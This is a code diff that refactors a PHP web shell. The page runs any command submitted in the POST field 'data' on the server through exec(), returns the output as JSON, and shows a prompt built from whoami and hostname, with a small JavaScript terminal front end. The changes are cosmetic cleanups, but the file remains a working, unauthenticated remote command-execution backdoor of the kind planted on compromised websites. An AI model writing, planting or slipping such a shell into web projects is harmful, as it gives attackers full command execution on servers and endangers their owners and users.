@@ -4,17 +4,16 @@
 	if(ISSET($_POST['data']) && !empty($_POST['data']))
 	{
 		//Grab data and redirect stdout
-		$command = $_POST['data'];
-		$command = $command." 2>&1";
+		$command = $_POST['data'] . " 2>&1";
 		
 		//Execute command on server, store output into output
-		exec($command,$output, $test);		
+		exec($command,$output);		
 
 		//Return the output
 		echo json_encode($output);
 		die();
 	}
-	
+
 	//Set our prompt text e.g "[apache@localhost] >> "
 	$PS1 = str_replace("\n","","[".shell_exec('whoami')." @ ".shell_exec("hostname")."] >> ");
 ?>
@@ -128,7 +127,6 @@ prompt.addEventListener("keyup", function(event)
 	else if(event.keyCode == 13) 
 	{
 		var command = document.getElementById("shell").value;
-		
 		if(command == "clear")
 			clearBuffer();
 		else
